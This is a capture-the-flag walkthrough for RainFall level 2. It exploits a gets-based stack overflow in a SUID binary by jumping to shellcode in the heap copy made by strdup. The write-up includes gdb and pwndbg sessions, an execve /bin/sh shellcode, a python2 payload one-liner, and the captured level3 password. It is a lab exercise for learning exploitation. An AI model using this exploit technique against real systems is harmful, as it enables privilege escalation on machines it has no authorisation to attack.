# Walkthrough for Level 2

## Understanding the Binary

Once again, we have a binary that is SUID and owned by the next level's user. If we manage to make it execute arbitrary
code, we'll be able to read the next user's password.

```shell
level2@RainFall:~$ ls -l ./level2 
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 ./level2
```

The binary has a function called `p` which is vulnerable to a buffer overflow attack since it uses the unsafe `gets`
function to populate a buffer. This means we are able to overwrite the return address of the `p` function and redirect
the program flow to an arbitrary set of instructions injected by ourselves. However, as we can see in the next lines of
code, if the return address starts with `0xb`, the binary exits immediately and does not execute our code.

```c
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",unaff_retaddr);
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
```

Using `gdb`, we start the program and give a long input. We see that all our input is stored in `0xbxxxxxxx` type
addresses. Redirecting the program flow to this zone will cause the program to exit.

```shell
(gdb) run 
Starting program: /home/user/level2/level2 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x/90xb $esp-90
0xbffff6c6:     0x00    0x00    0x00    0x00    0xc1    0x00    0x41    0x41
0xbffff6ce:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff6d6:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff6de:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff6e6:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff6ee:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff6f6:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff6fe:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff706:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff70e:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff716:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff71e:     0x41    0x41
```

We need to find another area outside the `0xbxxxxxxx` range to redirect the program flow. We find that the heap is a good
candidate, as it starts at `0x0804a000` and goes up to `0x0806b000`, and it has execution rights.

```shell
(gdb) shell cat /proc/$(pgrep level2)/maps
08048000-08049000 r-xp 00000000 00:10 12470      /home/user/level2/level2
08049000-0804a000 rwxp 00000000 00:10 12470      /home/user/level2/level2
0804a000-0806b000 rwxp 00000000 00:00 0          [heap]
b7e2b000-b7e2c000 rwxp 00000000 00:00 0 
b7e2c000-b7fcf000 r-xp 00000000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fcf000-b7fd1000 r-xp 001a3000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fd1000-b7fd2000 rwxp 001a5000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fd2000-b7fd5000 rwxp 00000000 00:00 0 
b7fd9000-b7fdd000 rwxp 00000000 00:00 0 
b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
b7fde000-b7ffe000 r-xp 00000000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
b7ffe000-b7fff000 r-xp 0001f000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
b7fff000-b8000000 rwxp 00020000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
```

Since the `p` function uses `strdup(buffer);` to copy the buffer into the heap, we will have our input stored both on the 
stack and on the heap. Therefore, we can overwrite the return address of the `p function with the address returned by 
`strdup`, where our code will be stored.

## Finding the Address Returned by `strdup`

Using `gdb`, we set a breakpoint at the end of the `strdup` function to inspect the registers and obtain the return
value of `strdup`. First, we need to find the address where we will set the breakpoint, and for that we use `ghidra`.
The result is `0x0804853e`.

```shell
(gdb) b *0x0804853e
Breakpoint 2 at 0x804853e
```

We run the program, and it will stop at the breakpoint we have set.

```shell
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level2/level2 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Breakpoint 2, 0x0804853e in p ()
```

We print the value stored in the `eax` register in hexadecimal format to get the address returned by `strdup`, which is
the address we will use to overwrite the return address of `p`.

```shell
(gdb) p /x $eax
$2 = 0x804a008
```

## Calculating the Instruction Pointer Offset

[Pwndbg](https://github.com/pwndbg/pwndbg) is a Python module that adds useful utilities and enhancements to GDB and
LLDB, making these debuggers easier to use.
Inside we find `Pwn cyclic` which is a tool used to identify the exact location of a buffer overflow.

It works by generating a sequence of unique patterns, which can be inputted into a program. Once the buffer overflow is
achieved, the crash dump will contain part of this unique pattern. By analyzing the crash dump, we can pinpoint the
exact offset where the buffer overflow occurred.

```shell
...SNIP...
pwndbg> cyclic 90
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa
pwndbg> run
Starting program: /home/kali/rainfall/level2/level2 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaauaaaraaasaaataaauaaavaaawa

Program received signal SIGSEGV, Segmentation fault.
0x61616175 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────[ REGISTERS / show-flags off / show-compact-regs off ]───────
 EAX  0x804a9c0 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaauaaaraaasaaataaauaaavaaawa'
 EBX  0xf7f99e14 (_GLOBAL_OFFSET_TABLE_) ◂— 0x232d0c /* '\x0c-#' */
 ECX  0x5b
 EDX  0x804a9c0 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaauaaaraaasaaataaauaaavaaawa'
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
 ESI  0x8048550 (__libc_csu_init) ◂— push ebp
 EBP  0x61616174 ('taaa')
 ESP  0xffffd200 ◂— 'vaaawa'
 EIP  0x61616175 ('uaaa')
...SNIP...
```

The register we are interested in is the EIP (Extended Instruction Pointer) register, which contains the address of the
next instruction to be executed. We see that the EIP register contains the value 'uaaa'. Using the cyclic -l command, we
can find the offset in the cyclic pattern that corresponds to this value. In this case, the offset is 80 bytes.

```shell
pwndbg> cyclic -l uaaa
Finding cyclic pattern of 4 bytes: b'uaaa' (hex: 0x75616161)
Found at offset 80
```

### The Payload

A `shellcode` is a sequence of instructions, often written in assembly language, designed to be executed directly by a
computer's processor. We look for a `shellcode` that spawns a shell and that is compatible with our machine architecture.
We find one that it works, and we use it as our payload (https://shell-storm.org/shellcode/files/shellcode-575.html)

```c
/* execve /bin/sh - x86/linux - 21 bytes . zeroed argv[] / envp[]
  ipv#oldschool@irc.worldnet.net ipv#backtrack-fr@irc.freenode.org
  thanks : `ivan, milo, #oldschool crew
*/

int main(){

char sc[] = "\x6a\x0b" // push byte +0xb
"\x58" // pop eax
"\x99" // cdq
"\x52" // push edx
"\x68\x2f\x2f\x73\x68" // push dword 0x68732f2f
"\x68\x2f\x62\x69\x6e" // push dword 0x6e69922f
"\x89\xe3" // mov ebx, esp
"\x31\xc9" // xor ecx, ecx
"\xcd\x80"; // int 0x80

((void (*)()) sc)();
}

/*
sc[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
*/
--
ipv
```

## Crafting the Exploit

We craft the final exploit by concatenating the payload, padding to fill the rest of the buffer, and the return address,
which points to our exploit in the heap. The return address must be in little-endian format, so we reverse the bytes.

exploit = payload + padding + return_address

exploit = payload + "A" * (offset - len(payload)) + return_address

exploit = payload + "A" * (80 - 21) + return_address

We use Python to generate the exploit and save it to a file:

```python
python2 -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * (80 - 21)  +  "\x08\xa0\x04\x08"' > /tmp/payloadlvl2
```

## Running the Exploit

We use the `cat` command with the `-` option to keep STDIN open, since the shell executed by the `p` function needs an
interactive terminal to work properly. Once we run our exploit successfully, we can use the `whoami` command to verify
that the shell is running as the `level3` user.

```shell
level2@RainFall:~$ cat /tmp/exploitlvl2 - | ./level2
j
X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
whoami
level3
```

## Getting the Password

Finally, we can read the `.pass` file of `level3` to complete the level.

```shell
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```